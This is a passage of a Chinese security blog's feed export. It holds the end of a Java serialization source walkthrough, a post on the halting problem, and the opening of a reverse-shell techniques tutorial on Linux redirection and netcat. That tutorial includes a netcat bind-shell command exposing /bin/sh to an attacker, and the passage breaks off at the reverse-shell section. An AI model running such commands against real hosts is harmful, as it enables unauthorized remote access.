class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fetches the serializable primitive field values of object obj and</span></span><br><span class="line"><span class="comment"> * marshals them into byte array buf starting at offset 0.  The caller</span></span><br><span class="line"><span class="comment"> * is responsible for ensuring that obj is of the proper type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrimFieldValues</span><span class="params">(Object obj, <span class="keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* assuming checkDefaultSerialize() has been called on the class</span></span><br><span class="line"><span class="comment">     * descriptor this FieldReflector was obtained from, no field keys</span></span><br><span class="line"><span class="comment">     * in array should be equal to Unsafe.INVALID_FIELD_OFFSET.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numPrimFields; i++) &#123;</span><br><span class="line">        <span class="keyword">long</span> key = readKeys[i];</span><br><span class="line">        <span class="keyword">int</span> off = offsets[i];</span><br><span class="line">        <span class="keyword">switch</span> (typeCodes[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Z'</span>:</span><br><span class="line">                Bits.putBoolean(buf, off, unsafe.getBoolean(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">                buf[off] = unsafe.getByte(obj, key);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                Bits.putChar(buf, off, unsafe.getChar(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                Bits.putShort(buf, off, unsafe.getShort(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                Bits.putInt(buf, off, unsafe.getInt(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                Bits.putFloat(buf, off, unsafe.getFloat(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">                Bits.putLong(buf, off, unsafe.getLong(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                Bits.putDouble(buf, off, unsafe.getDouble(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的8个case分别对应8个基本类型首字母：<code>int-long-float-double-short-char-byte-boolean</code></p><p>获得这些基础类型字段的值后，bout会将他们写入到字节流。</p><ol start="2"><li><strong>对象类型</strong></li></ol><p>到这里说明该field是这部分总体来说就是三步：</p><ul><li>获取所有序列化的字段</li><li>根据desc，获取所有序列化字段的值</li><li>递归完成序列化</li></ul><p><strong>总结：</strong> <strong>defaultWriteFields</strong> 原生类型直接序列化，而非原生类型则需要递归调用 writeObject0 来对字段序列化。</p><p><strong>到这里，整个序列化流程就结束了。</strong></p><h2 id="两个特殊点"><a href="#两个特殊点" class="headerlink" title="两个特殊点"></a>两个特殊点</h2><p>被<code>transient</code>修饰的成员属性具有”不会序列化“的语义，序列化的时候会忽略；</p><p>被<code>static</code>修饰的成员属性隶属于类而非对象，所以它在序列化的时候同样会被忽略。</p><h1 id="补充知识：ObjectStreamClass-amp-ObjectStreamField"><a href="#补充知识：ObjectStreamClass-amp-ObjectStreamField" class="headerlink" title="补充知识：ObjectStreamClass &amp; ObjectStreamField"></a>补充知识：ObjectStreamClass &amp; ObjectStreamField</h1><p>我们在刚才分析序列化流程中：</p><p>出现了desc这个类描述符。它是属于ObjectStreamClass的类对象。</p><p>并且很多次出现了解析Field字段时候，出现了ObjectStreamField这个类。</p><p>翻阅资料：</p><ul><li><code>ObjectStreamField</code> 按官方的说法是是<strong>字段的序列化描述符，本质是对 Field 字段的包装，包括字段名、字段值等</strong>。可以通过 ObjectStreamClass#getFields 获取所有需要序列化的字段信息。</li><li><code>ObjectStreamClass</code> 按官方的说法是<strong>类的序列化描述符</strong>，<strong>本质是对 Class 类的包装</strong>，提取了序列化时类的一些信息，包括字段的描述信息和 serialVersionUID。<strong>可以使用 lookup 方法找到/创建在此 Java VM 中加载的具体类的 ObjectStreamClass</strong>。</li></ul><p>这里其实我的理解是desc就是类的模板，</p><h2 id="ObjectStreamField"><a href="#ObjectStreamField" class="headerlink" title="ObjectStreamField"></a>ObjectStreamField</h2><p>依据难度先梳理一下ObjectStreamField这个类。</p><p><code>ObjectStreamField</code>类的实例<strong>描述了序列化的对象中成员属性的元数据信息</strong>，上边的这个方法用于判断当前描述的成员属性是一个基础类型的数据还是一个对象类型的数据，若当前描述的成员属性是基础类型这个函数返回true，反之返回false。该成员函数判断数据类型的方式是使用的签名中的类型代码来判断，前文多次提到类型代码的概念，目前可以知道对象类型的数据只有两种类型代码——数组array【[】和对象object【L】。</p><h3 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** field name */</span> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">//成员属性名称</span></span><br><span class="line"><span class="comment">/** canonical JVM signature of field type */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String signature;             <span class="comment">//成员属性的类型签名</span></span><br><span class="line"><span class="comment">/** field type (Object.class if unknown non-primitive type) */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;?&gt; type;                <span class="comment">//成员属性的类型</span></span><br><span class="line"><span class="comment">/** whether or not to (de)serialize field values as unshared */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> unshared;             <span class="comment">//属性是否是unshared</span></span><br><span class="line"><span class="comment">/** corresponding reflective field object, if any */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Field field;                  <span class="comment">//当前成员属性的JVM级别的元数据信息，在序列化提取成员属性的元数据信息时，会使用J反射，该成员的类型是java.lang.reflect.Field；</span></span><br><span class="line"><span class="comment">/** offset of field value in enclosing field group */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> offset = <span class="number">0</span>;                     <span class="comment">//偏移量，一个对象的成员属性个数超过一个时，JVM会将会把所有的成员属性打包成一个“组”来操作，而offset就是这个组中当前描述的成员属性的偏移量，上层的ObjectStreamClass在调用当前这个成员属性的时候就使用偏移量进行引用定位操作；</span></span><br></pre></td></tr></table></figure><p>这里梳理一下：<strong>类型，类型代码，类型签名</strong></p><ul><li>类型：类对象的型号，Java的成员属性的类型一般对应的Java数据类型为Class&lt;?&gt;；</li><li>类型代码：类型代码的数据也是用于JVM判断成员属性数据类型的一种方式，但<strong>类型代码的Java数据类型是char</strong>，比如<strong>‘L’</strong>，它一般通过<strong>一个字符</strong>来<strong><em>\</em>判断**</strong>当前的Java数据类型，序列化时它会把这个字符转换成二进制数据；</li><li>类型签名：<strong>类型签名的Java数据类型是一个String类型</strong>，比如：‘Ljava/lang/String;’，它和类型代码一样可以用于JVM判断成员属性的数据类型，但是不仅仅如此，JVM在处理类型签名的时候，针对成员属性、成员函数、类本身都可以使用统一的方式来区分，在JVM里面类型签名相当于类型的唯一标识，它的使用 范围比类型代码更加广阔；</li></ul><h3 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectStreamField</span><span class="params">(String name, Class&lt;?&gt; type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(name, type, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectStreamField</span><span class="params">(String name, Class&lt;?&gt; type, <span class="keyword">boolean</span> unshared)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.type = type;</span><br><span class="line">    <span class="keyword">this</span>.unshared = unshared;</span><br><span class="line">    signature = getClassSignature(type).intern();</span><br><span class="line">    field = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里第一个构造函数调用了第二个构造函数，并且给unshared属性赋值为false。</p><p>注意，这里的构造函数<strong>仅仅初始化字段属性，并没有给字段赋值，仅仅是初始化了字段的名称、类型</strong></p><h2 id="ObjectStreamClass"><a href="#ObjectStreamClass" class="headerlink" title="ObjectStreamClass"></a>ObjectStreamClass</h2><p>这个类主要用来<strong>提取序列化过程中某个对象所属类的元数据信息</strong>，对象所属类包含的元数据信息比起它的成员属性包含的元数据信息要复杂许多。</p><h3 id="成员属性-1"><a href="#成员属性-1" class="headerlink" title="成员属性"></a>成员属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类的基本信息</span></span><br><span class="line"><span class="keyword">private</span> Class&lt;?&gt; cl;            <span class="comment">// 1. Class</span></span><br><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// 2. cl.getName()</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> Long suid;     <span class="comment">// 3. serialVersionUID</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> isProxy;        <span class="comment">// 4. Proxy.isProxyClass(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> isEnum;         <span class="comment">// 5. Enum.class.isAssignableFrom(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> serializable;   <span class="comment">// 6. Serializable.class.isAssignableFrom(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> externalizable; <span class="comment">// 7. Externalizable.class.isAssignableFrom(cl)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Serializable 接口默认的方法，通过反射调用</span></span><br><span class="line"><span class="keyword">private</span> Constructor&lt;?&gt; cons;            <span class="comment">// 默认的构造函数</span></span><br><span class="line"><span class="keyword">private</span> Method writeObjectMethod;       <span class="comment">// writeObject</span></span><br><span class="line"><span class="keyword">private</span> Method readObjectMethod;        <span class="comment">// readObject</span></span><br><span class="line"><span class="keyword">private</span> Method readObjectNoDataMethod;  <span class="comment">// readObjectNoData</span></span><br><span class="line"><span class="keyword">private</span> Method writeReplaceMethod;      <span class="comment">// writeReplace</span></span><br><span class="line"><span class="keyword">private</span> Method readResolveMethod;       <span class="comment">// readResolve</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> hasWriteObjectData;     <span class="comment">// writeObjectMethod!=null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// localDesc表示本类的描述信息，superDesc表示父类的描述信息</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass localDesc;    <span class="comment">// this</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass superDesc;    <span class="comment">// 父类，superDesc=ObjectStreamClass.lookup(superCl, false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要序列化的字段信息，通过 getSerialFields(c1) 获取</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamField[] fields;     <span class="comment">// 序列化的字段信息</span></span><br></pre></td></tr></table></figure><p>再提一下lookup方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// false 表示只获取实现了 Serializable 接口的类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ObjectStreamClass <span class="title">lookup</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> lookup(cl, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// true 表示不管是否实现这个接口都提取相关的信息</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ObjectStreamClass <span class="title">lookupAny</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>借用<a href="https://www.cnblogs.com/binarylei/p/10987933.html" target="_blank" rel="noopener">binarylei</a>师傅的图：</p><p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210716150301931.png" alt="image-20210716150301931"></p><p>每一个序列化结果中，都先包含一段类描述信息，然后才是对象的信息。</p><p>注意：</p><ul><li>一个类对象如果想序列化成功，要求所有属性实现Serializable接口</li><li>transient和static属性不参于序列化</li><li>序列化具有继承性，如果一个类实现了序列化，那么他的子类可以参与序列化</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理Java序列化流程。&lt;/p&gt;
&lt;p&gt;参考&lt;a href=&quot;https://www.cnpanda.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;panda&lt;/a&gt;师傅。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://fynch3r.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>程序分析理论</title>
    <link href="https://fynch3r.github.io/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/"/>
    <id>https://fynch3r.github.io/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/</id>
    <published>2021-06-26T08:32:31.000Z</published>
    <updated>2021-11-18T02:25:50.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>开帘顿觉春风暖，满纸淋漓白云声。</p></blockquote><p>梳理程序分析重要又有趣的理论。</p><a id="more"></a><h1 id="理发师悖论"><a href="#理发师悖论" class="headerlink" title="理发师悖论"></a>理发师悖论</h1><p>村庄里有一位理发师，他说“我只给那些不给自己理发的人理发”。随着自己的头发越来越长，他陷入了困境。</p><p>如果他不给自己理发，那么他实际上是不给自己理发的人，他需要给自己理发。</p><p>如果他给自己理发，他就不是那些不给自己理发的人了，他不能为自己理发。</p><h1 id="停机问题"><a href="#停机问题" class="headerlink" title="停机问题"></a>停机问题</h1><p>证明：“计算机不是万能的。”</p><p>最准确&amp;最易懂的<a href>版本</a>；</p><p>假设现在有两台机器 A &amp; C：</p><p>A负责计算两个数的和，例如输入3、5，输出就是8；</p><p>C负责计算棋局下一步的最优解；</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210626171558276.png" alt="image-20210626171558276"></p><p>A &amp; C 都泛指正常的计算机程序：接收输入，输出结果。</p><p>对于只要能正常输出结果(不管结果对错)的程序，都可以称为该程序可以<strong>停机</strong>。</p><p>对于程序陷入了死循环等问题，导致迟迟没有结果的输出的局面，那么该程序无法停机。</p><p>比如说A、C互换输入，那么就会导致出现停机。</p><p>这时候我们想有一台上帝的杰作H，H就是传说中的“上帝之眼”，给它读入<strong>任意</strong>一台机器的蓝图，以及任意一个问题（输入）后，它都能根据蓝图模拟出该机器的运作过程，从而判断出哪些问题（输入）会导致该机器<strong>出错</strong>（即无法停机），哪些问题则<strong>不会出错</strong>（即成功<strong>停机</strong>）：</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210628093230413.png" alt="image-20210628093230413"></p><p>那么这个H真的存在么？</p><p>接下来逻辑证明<strong>H是不存在</strong>的：</p><p>注意H的大前提是可以为<strong>任意程序蓝图+任意输入判断是否停机</strong>。</p><p>假设现在有一个机器X：</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210628093607208.png" alt="image-20210628093607208"></p><p>X由3部分组成：P、H、N</p><p>P负责将输入一分为二；</p><p>H是“上帝之眼”</p><p>N是反转器：</p><ul><li>如果H给出的结果是not stuck，那么N的结果就是stuck；</li><li>如果H给出的结果是stuck，那么N的结果就是not stuck:)</li></ul><p>现在，<strong>如果我们把X自身的蓝图给X</strong>，会发生什么？</p><p>此时H就会对X的蓝图判定，输入是X蓝图的情况下会发生什么？</p><p>如果H给出的是not stuck，那么X最终的输出结果就是stuck，相悖！</p><p>如果H给出的是stuck，那么X最终的结果就是not stuck，相悖！ </p><p>所以X自身就是一个反例，因此逻辑层面就会证明，<strong>世界上根本不存在H</strong>。 </p><h2 id="程序语言分类"><a href="#程序语言分类" class="headerlink" title="程序语言分类"></a>程序语言分类</h2><p>两类：</p><ul><li><strong>DSL</strong>：特定领域语言。Domain Specific Language ，比如描述数据的JSON，标签型XML、HTML，查询语言SQL等等。</li><li><strong>GPL</strong>：通用用途语言。General Specifc Language，主流编程语言，C/Java/JS/Go…，他们都是图灵完备的。</li></ul><h1 id="程序分析技术栈"><a href="#程序分析技术栈" class="headerlink" title="程序分析技术栈"></a>程序分析技术栈</h1><p><a href="https://blog.csdn.net/qq_37206105/article/details/116401043?spm=1001.2014.3001.5501" target="_blank" rel="noopener">canliture师傅</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;开帘顿觉春风暖，满纸淋漓白云声。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理程序分析重要又有趣的理论。&lt;/p&gt;
    
    </summary>
    
    
      <category term="静态分析" scheme="https://fynch3r.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="静态分析理论基础" scheme="https://fynch3r.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell姿势总结</title>
    <link href="https://fynch3r.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <id>https://fynch3r.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</id>
    <published>2021-06-08T12:01:51.000Z</published>
    <updated>2021-06-15T01:33:20.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>曲径通幽处，禅房花木深。</p></blockquote><p> 抽空总结一下nc经典用法以及反弹shell的多种姿势。   </p><a id="more"></a><h1 id="linux文件描述符和重定向"><a href="#linux文件描述符和重定向" class="headerlink" title="linux文件描述符和重定向"></a>linux文件描述符和重定向</h1><p>在反弹shell的时候疑惑，神奇的<code>&amp;、&lt;、&gt;</code>都是用来做什么的？</p><p>没错，他们就是负责将文件描述符重定向的。</p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>linux跟踪打开的文件，并且分配给他一个数字，这个数字用于充当句柄。</p><p>linux启动的时候会自动启动三个文件描述符：</p><ol><li>stdin 标准输入 0 键盘</li><li>stdout 标准输出 1 显示器</li><li>stderr 错误输出 2 显示器</li></ol><p>之后再打开文件，数字自动递增</p><p>并且所有的shell命令都会默认拥有这三个描述符（0，1，2）</p><p>举个例子，如果我们想要把输出的内容输出到文件中，或者想从文件中读取输入，我们需要的是：</p><p><strong>修改数字 ，将文件描述符重定向。</strong></p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>两种：</p><ol><li>输入重定向 &lt;</li><li>输出重定向 &gt;</li></ol><p>记忆方法：在命令行中，<strong>命令总是在左侧，而重定向符号“指向”数据流动</strong></p><p>默认的重定向会覆盖文件内容，如果想追加 ，可以&lt;&lt; 、&gt;&gt; </p><p>一般0、1、2都写在左侧</p><p>当解析器解析到重定向符号的话，就会先处理重定向。</p><p>就像下面这个小例子：</p><p>输入：输入流默认是0，修改了0的指向，让它指向file.txt，cat自然就会去读标准输入流</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打印文件内容</span><br><span class="line"><span class="keyword">cat</span> 0&lt; <span class="keyword">file</span>.txt</span><br><span class="line"><span class="keyword">cat</span> &lt; <span class="keyword">file</span>.txt</span><br><span class="line">0&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br><span class="line">&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br></pre></td></tr></table></figure><p>输出：输出流默认是1，修改了1的指向，将输出内容输出到文件file.txt中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">（覆盖）</span></span><br><span class="line">echo hello &gt; file.txt</span><br><span class="line">echo hello 1&gt; file.txt</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br></pre></td></tr></table></figure><p>将命令结果输出到文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">ls &amp;&gt; result.txt</span><br></pre></td></tr></table></figure><h3 id="文件描述符的操作"><a href="#文件描述符的操作" class="headerlink" title="文件描述符的操作"></a>文件描述符的操作</h3><p><strong>模糊输出    &gt;&amp;   &lt;&amp;</strong></p><p>正确、错误都输出到同一个地方（1，2）</p><p><strong>文件描述符重定向</strong></p><p>n&lt;&amp;m n&gt;&amp;m</p><p>以上两种模式都是将n复制到m，只不过分别是只读/写，两种模式</p><p><strong>因此对于 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p><strong>2&gt;&amp;1</strong>  意思就是把 标准错误输出 重定向到(指向) 标准输出，</p><p><strong>&amp; 目的是为了区分数字名字的文件和文件描述符</strong></p><p>如果没有<code>&amp;</code>，系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>那么下面两种命令是等价的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="命令的顺序"><a href="#命令的顺序" class="headerlink" title="命令的顺序"></a>命令的顺序</h3><p>系统读取shell命令永远是从左到右</p><p>顺序不同导致结果不同</p><p>举个例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准输出重定向到了result.txt，接下来把标准错误输出指向了标准输出，等量代换，最终就是标准错误输出指向指向result.txt</span></span><br><span class="line">mkdir 2&gt;&amp;1 &gt; result.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准错误输出指向了标准输出，接下来又把标准输出指向了result.txt，导致链断掉</span></span><br></pre></td></tr></table></figure><p><strong>exec I/O重定向</strong></p><p>exec命令就是以新的进程去代替原来的进程，但进程的PID保持不变。因此，可以这样认为，exec系统调用并没有创建新的进程，只是替换了原来进程上下文的内容。原进程的代码段，数据段，堆栈段被新的进程所代替。</p><p>举个例子:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec 55&lt;&gt;test.txt # 创建一个新描述符55 该进程所有的输出重定向到result.txt文件下</span><br><span class="line">ls &gt;&amp;55</span><br><span class="line">cat test.txt # 命令都输出在test.txt里面</span><br><span class="line">exec 55&gt;&amp;- # 销毁55号描述符</span><br></pre></td></tr></table></figure><h1 id="NetCat基本用法"><a href="#NetCat基本用法" class="headerlink" title="NetCat基本用法"></a>NetCat基本用法</h1><p>几个重要参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l 开启监听模式</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-vv 显示超级详细信息</span><br><span class="line">-p 本地端口 </span><br><span class="line">-e 程序重定向 -e /bin/sh</span><br></pre></td></tr></table></figure><p>测试环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机：A</span><br><span class="line">受害机：B</span><br></pre></td></tr></table></figure><h2 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h2><p>原理：</p><p>受害主机将bash交付给5555端口，攻击机连接5555端口即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B:nc -lvvp 5555 -e /bin/sh</span><br><span class="line">A:nc [A's IP] 5555</span><br></pre></td></tr></table></figure><h2 id="反向连接shell"><a 